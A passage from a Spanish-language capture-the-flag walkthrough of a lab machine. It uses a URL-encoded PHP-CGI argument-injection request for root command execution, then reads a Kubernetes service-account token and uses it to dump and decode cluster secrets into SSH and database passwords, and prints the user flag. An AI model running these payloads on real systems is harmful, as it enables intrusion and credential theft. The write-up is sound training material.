2025/11/02 16:52:47 client: Connecting to ws://10.10.15.50:8888
2025/11/02 16:52:47 client: Connected (Latency 36.221762ms)
```

Por lo que vemos ha funcionado, ahora en la maquina atacante si listamos los puertos:

```shell
ss -tuln
```

Info:

```
tcp              LISTEN            0                 4096                                       *:5000                                     *:*               
tcp              LISTEN            0                 4096                                       *:8888                                     *:*
```

Por lo que vemos esta funcionando, ahora vamos a realizar un `fuzzing` sobre dicho puerto `5000` a ver que conseguimos.

## Escalate user babywyrm

### Vulnerabilidad PHP-CGI (RCE)

Como sabemos que utiliza el `PHP-CGI` podemos probar una `vulnerabilidad` tipica de ello, vamos a probar a realizar lo siguiente:

```shell
curl "http://localhost:5000/cgi-bin/php-cgi?-%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+-%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+-%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+-%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+-%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+-%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+-%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+-%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+-%6E" -X POST -d "id"
```

Info:

```
[START]uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[END]
```

Vemos que esta funcionando, por lo que vamos a realizar un poco mas de `fuzzing` dentro de este entorno, ya que realizar una `reverse shell` puede ser algo mas complicado.

Investigando un poco veremos que el archivo `start.sh` revela una ruta dentro de `/var/run` en la que hay cosas interesantes.

```shell
curl "http://localhost:5000/cgi-bin/php-cgi?-%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+-%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+-%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+-%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+-%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+-%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+-%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+-%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+-%6E" -X POST -d "ls -la /"
```

Info:

```
[START]total 72
drwxr-xr-x    1 root     root          4096 Nov  2 18:46 .
drwxr-xr-x    1 root     root          4096 Nov  2 18:46 ..
drwxr-xr-x    1 root     root          4096 Jul 26 22:09 bin
drwxr-xr-x    5 root     root           360 Nov  2 18:46 dev
drwxr-xr-x    1 root     root          4096 Nov  2 18:46 etc
drwxr-xr-x    1 root     root          4096 Jan 27  2024 home
drwxr-xr-x    1 root     root          4096 Jul 26 22:09 lib
drwxr-xr-x    5 root     root          4096 Jan 26  2024 media
drwxr-xr-x    2 root     root          4096 Jan 26  2024 mnt
drwxr-xr-x    2 root     root          4096 Jan 26  2024 opt
dr-xr-xr-x  468 root     root             0 Nov  2 18:46 proc
drwx------    1 root     root          4096 Feb 16  2024 root
drwxr-xr-x    1 root     root          4096 Nov  2 18:46 run
drwxr-xr-x    1 root     root          4096 Jul 26 22:09 sbin
drwxr-xr-x    2 root     root          4096 Jan 26  2024 srv
-rwxr-x--x    1 root     root           311 Jul 24 01:52 start.sh
dr-xr-xr-x   13 root     root             0 Nov  2 15:31 sys
drwxrwxrwt    1 root     root          4096 Feb 16  2024 tmp
drwxr-xr-x    1 root     root          4096 Feb 16  2024 usr
drwxr-xr-x    1 root     root          4096 Jan 27  2024 var
[END]
```

> start.sh

```bash
[START]#!/bin/sh
echo "🚀 Starting REAL php-cgi..."

mkdir -p /var/run
spawn-fcgi -s /var/run/php-cgi.socket -U nginx -G nginx \
          -- /usr/local/bin/php-cgi
chmod 666 /var/run/php-cgi.socket
echo "✅ php-cgi.socket ready"
ls -la /var/run/php-cgi.socket

echo "🌐 Starting nginx..."
nginx -g "daemon off;"
[END]
```

Si listamos `/var/run` veremos lo siguiente:

```shell
curl "http://localhost:5000/cgi-bin/php-cgi?-%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+-%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+-%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+-%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+-%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+-%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+-%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+-%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+-%6E" -X POST -d "ls -la /var/run/*"
```

Info:

```
[START]-rw-r--r--    1 root     root             3 Nov  2 18:46 /var/run/nginx.pid
srw-rw-rw-    1 nginx    nginx            0 Nov  2 18:46 /var/run/php-cgi.socket

/var/run/nginx:
total 8
drwxr-xr-x    2 nginx    nginx         4096 Jul 26 22:09 .
drwxr-xr-x    1 root     root          4096 Nov  2 18:46 ..

/var/run/secrets:
total 12
drwxr-xr-x    3 root     root          4096 Nov  2 18:46 .
drwxr-xr-x    1 root     root          4096 Nov  2 18:46 ..
drwxr-xr-x    3 root     root          4096 Nov  2 18:46 kubernetes.io
[END]
```

### Secrets de kubernetes

Vemos que hay un `secrets` y si seguimos la ruta de carpetas nos llevara a este ultimo directorio en el que contiene estos archivos:

```shell
curl "http://localhost:5000/cgi-bin/php-cgi?-%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+-%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+-%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+-%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+-%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+-%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+-%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+-%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+-%6E" -X POST -d "ls -la /var/run/secrets/kubernetes.io/serviceaccount"
```

Info:

```
[START]total 4
drwxrwxrwt    3 root     root           140 Nov  2 18:46 .
drwxr-xr-x    3 root     root          4096 Nov  2 18:46 ..
drwxr-xr-x    2 root     root           100 Nov  2 18:46 ..2025_11_02_18_46_07.2872315250
lrwxrwxrwx    1 root     root            32 Nov  2 18:46 ..data -> ..2025_11_02_18_46_07.2872315250
lrwxrwxrwx    1 root     root            13 Nov  2 15:31 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Nov  2 15:31 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Nov  2 15:31 token -> ..data/token
[END]
```

Vemos que son archivos muy interesantes...

> ca.crt

```
-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
dmVyLWNhQDE3MjY5Mjc3MjMwHhcNMjQwOTIxMTQwODQzWhcNMzQwOTE5MTQwODQz
WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3MjY5Mjc3MjMwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAATWYWOnIUmDn8DGHOdKLjrOZ36gSUMVrnqqf6YJsvpk
9QbgzGNFzYcwDZxmZtJayTbUrFFjgSydDNGuW/AkEnQ+o0IwQDAOBgNVHQ8BAf8E
BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUtCpVDbK3XnBv3N3BKuXy
Yd0zeicwCgYIKoZIzj0EAwIDSAAwRQIgOsFo4UipeXPiEXvlGH06fja8k46ytB45
cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
-----END CERTIFICATE-----
```

> namespace

```
default
```

> token

```
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNjQ1MTUzLCJpYXQiOjE3NjIxMDkxNTMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZDBkZjg2MGQtMTRmOC00OTg3LWJhNWMtNzkzOTU2ZWJlY2ExIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LXpjeDg4IiwidWlkIjoiNjEyYmJmZjMtOTQ3NS00ZGVmLTg2MjQtNTI1ODI4MzAwNDAzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjExMjc2MH0sIm5iZiI6MTc2MjEwOTE1Mywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.UXr0Y19aW6jyIPjtbxPYF8No7ZGofuDufrN5eFZt4NY8skf_k9i79KhHym9yQ2oQthhrGbDjwPfWy7ZMcsK_NZ75WdUwHiVsP45T9nAXK5E_-Vu6DIn4CrgYZ233OOv2ZtDx-LeJfi930WZ7GOhtt6aRRWLBssiM18kaJCqVLogCauT0iWSC-ngyYrLeaqTBaPiNRYIy9zSJ_cTOo4qTvRiFj5MRB4tBQ_1ij7uz_XlmiTcvGlY9jIExnHMWwXPFKNpmEx6KuL73bxEkosARtcv9ysODMTtUbuI7DFHMKD1pwE5aE9unQ-kLF78ZbZ-1ntunDRFRHAJFHqIsx4pFvw
```

Teniendo esto podremos utilizar ese `token` para autenticarnos dentro del `clúster` y obtener informacion varia, por ejemplo vamos a obtener toda la informacion que haya con dicho `token` del `kubernete` de esta forma:

```shell
curl "http://localhost:5000/cgi-bin/php-cgi?-%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+-%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+-%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+-%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+-%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+-%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+-%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+-%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+-%6E" -X POST -d "curl -k -H \"Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
```

Info:

```
Con este comando:

curl "http://localhost:5000/cgi-bin/php-cgi?-[TUS_PARAMETROS]" -X POST -d "curl -k -H \"Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets"

Aparece excesiba informacion, pero muy valiosa:

"kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2865297"
  },
  "items": [
    {
      "metadata": {
        "name": "beta-vino-wp-mariadb",
        "namespace": "default",
        "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
        "resourceVersion": "2088227",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "mariadb",
          "app.kubernetes.io/part-of": "mariadb",
          "app.kubernetes.io/version": "11.8.2",
          "helm.sh/chart": "mariadb-21.0.0"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:mariadb-password": {},
                "f:mariadb-root-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/part-of": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "beta-vino-wp-wordpress",
        "namespace": "default",
        "uid": "1cbbc5ac-1611-46af-8033-09e98dfc546b",
        "resourceVersion": "2088228",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "wordpress",
          "app.kubernetes.io/version": "6.8.2",
          "helm.sh/chart": "wordpress-25.0.5"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:wordpress-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "wordpress-password": "TzhGN0tSNXpHaQ=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v58",
        "namespace": "default",
        "uid": "13034cd4-64e1-4e2e-9182-4ce0ffda27e8",
        "resourceVersion": "2123405",
        "creationTimestamp": "2025-08-30T05:17:49Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "58"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T05:21:45Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "release": "SDRzSUFBQUFBQUFDLyt6OTYzS2p5Sm9vRE4rS3dyRWpacy9zS2pjZ3kxMnFpUFZEWUlIQU1pNGhjZHc5TWNISmdKUWdXb0FrdEw1MUk5K3Y5OXJlSzNrams0TUFnUTR1dTFldm1aNklOZTJ5Z2N4ODhqa2YvMzRYNkw1OTkvM09zR1A5NjlZTDFsOTM0ZDJYT3k5NFc5OTkvL3ZkbTdlSjR2K3k3QkNzVTl1NiszNUhZTVREVjJ6NGxjQVhCUEVkLy9WN0g3L3ZZOWdE....REsto de BAse64"
},
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v59",
        "namespace": "default",
        "uid": "b13ad2de-48a9-4520-beac-ab1f797c229e",
        "resourceVersion": "2140225",
        "creationTimestamp": "2025-08-30T05:21:44Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "59"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T19:50:24Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "release": "SDRzSUFBQUFBQUFDLy...Resto de base64"
},
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v60",
        "namespace": "default",
        "uid": "29b505fa-d785-40db-aa62-73414547307d",
        "resourceVersion": "2140413",
        "creationTimestamp": "2025-08-30T19:50:24Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "60"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T19:54:17Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "release": "SDRzSUFBQUFBQUFDLyt6OTYzS2p5Sm9vRE4rS3dyRWpacy9zS2pjZ3kxMnFpUFZEWUlIQU1pNGhjZHc5TWNISmdKUWdXb0FrdEw1MUk5K3Y5OXJlSzNrams0TUFnUTR1dTFldm1aNklOZTJ5Z2N4ODhqa2Yv... Resto de base64"
},
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.beta-vino-wp.v61",
        "namespace": "default",
        "uid": "ec2b989a-4f18-48de-bde5-645527bbc132",
        "resourceVersion": "2140661",
        "creationTimestamp": "2025-08-30T19:54:17Z",
        "labels": {
          "modifiedAt": "1726957051",
          "name": "beta-vino-wp",
          "owner": "helm",
          "status": "superseded",
          "version": "61"
        },
        "managedFields": [
          {
            "manager": "Helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-30T19:58:07Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "release": "SDRzSUFBQUFBQUFDL... Resto de Base64"
},
................<RESTO DE INFO IGUAL HASTA LLEGAR AL FINAL...>.....................
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "user-secret-babywyrm",
        "namespace": "default",
        "uid": "ffe29e4b-9beb-4d59-b26e-864cec7130c8",
        "resourceVersion": "2855797",
        "creationTimestamp": "2025-11-02T15:31:52Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-babywyrm",
            "uid": "ae7b8d31-5146-4ef5-ac29-bf04d3e3094f",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-02T15:31:52Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:MASTERPASS": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"ae7b8d31-5146-4ef5-ac29-bf04d3e3094f\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "MASTERPASS": "c3RBdnQ1Q3EyRlEyYjVGTzN2N21tc1FmWjFxRFBDZFQ="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "user-secret-margotrobbie",
        "namespace": "default",
        "uid": "535afb18-a6bc-44df-a7a3-5c56f6153e9f",
        "resourceVersion": "2855886",
        "creationTimestamp": "2025-11-02T15:32:00Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-margotrobbie",
            "uid": "88c5b2a1-41fe-4fdb-9441-8d024a7a586d",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-02T15:32:00Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:USER_PASSWORD": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"88c5b2a1-41fe-4fdb-9441-8d024a7a586d\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "USER_PASSWORD": "akwwRjdLeG5CVzhINk9mZWVzNmMwdExhODRnc2Y3N04="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "user-secret-sydneysweeney",
        "namespace": "default",
        "uid": "d0d9f489-da1f-4c3e-a64b-66b3848bcb51",
        "resourceVersion": "2855865",
        "creationTimestamp": "2025-11-02T15:31:56Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-sydneysweeney",
            "uid": "e05ca5be-8568-4305-a497-4159aaee8d7d",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-02T15:31:56Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:USER_PASSWORD": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"e05ca5be-8568-4305-a497-4159aaee8d7d\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "USER_PASSWORD": "U1lCRm5zdGpMR2RaREdLUVVHY1BqZFg5QWlFaEJOcm8="
      },
      "type": "Opaque"
    }
  ]
}
```

### Secrets encontrados y sus valores en base64:

1. **beta-vino-wp-mariadb**:
   * `mariadb-password`: `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`
   * `mariadb-root-password`: `c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==`
2. **beta-vino-wp-wordpress**:
   * `wordpress-password`: `TzhGN0tSNXpHaQ==`
3. **User secrets** (los más interesantes):
   * `user-secret-babywyrm`: `MASTERPASS` = `c3RBdnQ1Q3EyRlEyYjVGTzN2N21tc1FmWjFxRFBDZFQ=`
   * `user-secret-margotrobbie`: `USER_PASSWORD` = `akwwRjdLeG5CVzhINk9mZWVzNmMwdExhODRnc2Y3N04=`
   * `user-secret-sydneysweeney`: `USER_PASSWORD` = `U1lCRm5zdGpMR2RaREdLUVVHY1BqZFg5QWlFaEJOcm8=`

Ahora si lo decodificamos todo de una:

```shell
# Decodificar los secrets de usuarios
echo "c3RBdnQ1Q3EyRlEyYjVGTzN2N21tc1FmWjFxRFBDZFQ=" | base64 -d
echo "akwwRjdLeG5CVzhINk9mZWVzNmMwdExhODRnc2Y3N04=" | base64 -d  
echo "U1lCRm5zdGpMR2RaREdLUVVHY1BqZFg5QWlFaEJOcm8=" | base64 -d

# También los de la base de datos por si acaso
echo "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T" | base64 -d
echo "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==" | base64 -d
echo "TzhGN0tSNXpHaQ==" | base64 -d
```

### Credenciales decodificadas:

**Usuarios/Passwords:**

* `babywyrm` : `stAvt5Cq2FQ2b5FO3v7mmsQfZ1qDPCdT` (MASTERPASS)
* `margotrobbie` : `jL0F7KxnBW8H6Ofees6c0tLa84gsf77N`
* `sydneysweeney` : `SYBFnstjLGdZDGKQUGcPjdX9AiEhBNro`

**Base de datos:**

* MySQL root: `sW5sp4syetre32828383kE4oS`
* MySQL user: `sW5sp4spa3u7RLyetrekE4oS`
* WordPress: `O8F7KR5zGi`

Vamos a probar las credenciales por `SSH` a ver cual nos puede servir.

```shell
ssh babywyrm@<IP>
```

Metemos como contraseña `stAvt5Cq2FQ2b5FO3v7mmsQfZ1qDPCdT`...

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Nov 2 19:22:25 2025 from 10.10.15.50
babywyrm@giveback:~$ whoami
babywyrm
```

Veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
2eb070ce6ead3aa8944659588b7893d1
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0,
    timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

Vemos que podemos ejecutar como el usuario `root` el binario `debug` por lo que vamos a investigar que hace dicho binario.

Si lo iniciamos con `sudo` veremos que nos pide una `password` administrativa, la cual no sabemos, recordemos antes que enumeramos los `secrets` de los `kubernetes`, si probamos las contraseñas de `mariadb` decodificadas no funcionara, tendremos que meter la contraseña codificada.

> mariadb-password (Base64)

```
c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
```

Si probamos esa contraseña codificada en `Base64`...

```shell
sudo /opt/debug
```

Metemos como contraseña `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`...

```
Validating sudo...
Please enter the administrative password:

Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime

runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format and is a compliant implementation of the
Open Container Initiative specification.

runc integrates well with existing process supervisors to provide a production
container runtime environment for applications. It can be used with your
existing process monitoring tools and the container will be spawned as a
direct child of the process supervisor.

Containers are configured using bundles. A bundle for a container is a directory
that includes a specification file named "config.json" and a root filesystem.
The root filesystem contains the contents of the container.

To start a new instance of a container:

    # runc run [ -b bundle ] <container-id>

Where "<container-id>" is your name for the instance of the container that you
are starting. The name you provide for the container instance must be unique on
your host. Providing the bundle directory using "-b" is optional. The default
value for "bundle" is the current directory.

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
